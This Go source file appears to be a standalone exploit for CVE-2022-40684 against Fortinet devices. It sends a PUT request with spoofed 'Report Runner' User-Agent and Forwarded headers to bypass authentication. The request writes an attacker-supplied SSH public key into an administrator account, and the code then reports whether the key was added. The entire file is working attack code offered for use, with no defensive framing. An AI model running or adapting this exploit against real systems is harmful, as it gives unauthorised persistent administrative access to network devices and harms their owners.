package c_2022_40684

import (
	"fmt"
	"github.com/fatih/color"
	"github.com/imroc/req/v3"
	"os"
	"strings"
)

var (
	urlBase  string
	userName string
)

func formatKey(filePath string) string {
	content, err := os.ReadFile(filePath)
	if err != nil {
		color.Red("[-] %s", err.Error())
		color.Red("[-] Read th key file Failed")
		os.Exit(0)
	}
	color.Green("[+] Read th key file success")
	return strings.TrimRight(string(content), "\n")
}

func Exploit(urlInput, username, filePath string) {
	if strings.HasSuffix(urlInput, `/`) {
		urlInput = strings.TrimRight(urlInput, `/`)
	}
	sshKey := fmt.Sprintf(`"%s"`, formatKey(filePath))

	urlBase = urlInput
	userName = username
	urlIndex := fmt.Sprintf(`%s/api/v2/cmdb/system/admin/%s`, urlBase, userName)
	payload := map[string]string{
		"ssh-public-key1": sshKey,
	}
	client := req.C()
	client.EnableForceHTTP1()
	client.EnableInsecureSkipVerify()
	client.SetProxyURL("http://127.0.0.1:8080")
	customHeader := map[string]string{
		`User-Agent`: `Report Runner`,
		`Forwarded`:  `for="[127.0.0.1]:8888";by="[127.0.0.1]:8888"`,
	}
	resp, err := client.R().SetHeaders(customHeader).SetBodyJsonMarshal(payload).Put(urlIndex)
	if err != nil {
		color.Red("[-] %s", err.Error())
		color.Red("[-] Upload the ssh-key file failed")
		return
	}
	if strings.Contains(resp.String(), `SSH key is good`) {
		color.Green("[+] Target: %s is vulnerable")
		color.Green("[+] SSH-Key added successfully")
	} else {
		color.Red("[-] Vul is not vulnerable")
	}
}
